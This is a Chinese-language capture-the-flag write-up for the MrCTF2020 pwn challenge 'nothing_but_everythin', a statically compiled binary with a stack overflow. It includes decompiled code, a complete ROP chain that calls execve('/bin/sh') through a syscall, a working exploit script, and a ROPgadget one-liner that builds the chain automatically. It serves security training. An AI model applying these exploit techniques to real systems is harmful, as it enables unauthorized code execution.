
## nothing_but_everythin
- 题目描述：
    
    > What could you do with such a pile of rubbish?
- 题目附件：[nothing_but_everythin](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/nothing_but_everythin/nothing_but_everythin)
- 考察点：栈溢出、静态编译
- 难度：简单
- 初始分值：500
- 最终分值：465
- 完成人数：15

### 程序分析

第两次`read`存在栈溢出：

```c
undefined8 main(void){
  undefined local_78 [112];
  
  FUN_00411f60(PTR_DAT_006b97a8,0);
  FUN_00411f60(PTR_DAT_006b97a0,0);
  read(0,&DAT_006bc3a0,0x14);
  read(0,local_78,0x300);
  puts(local_78);
  return 0;
}
```

### 解题思路
直接找gadget，构造rop链：

```python
def ropchain():
    from struct import pack
    # Padding goes here
    p = ''
    p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
    p += pack('<Q', 0x00000000006BC3A0) # data /bin/sh
    p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    p += pack('<Q', 0x0000000000000000) # data 0
    p += pack('<Q', 0x0000000000449505) # pop rdx ; ret
    p += pack('<Q', 0x0000000000000000) # data 0
    p += pack('<Q', 0x00000000004494ac) # pop rax ; ret
    p += pack('<Q', 0x000000000000003b) # date 0x3b
    p += pack('<Q', 0x000000000040123c) # syscall
    return p
```

> 其中`"/bin/sh\0"`可以利用第一次`read`读入

### exp

```python
# rop1
offset = 15
payload = p64(0x0)*offset
payload += ropchain()

sl('/bin/sh\0')
#debug()
sl(payload)

p.interactive()
```

### More

这题可以`ROPgadget`一把梭，刚开始远程打不了，以为是一把梭脚本有问题，后来群里说是题目的问题。。。。修好了之后又试了一下一把梭，可以打：

```bash
ROPgadget --binary ./nothing_but_everythin --ropchain
```

> 静态编译的程序中存在大量gadget，因此可以直接用ROPgadget生成rop链

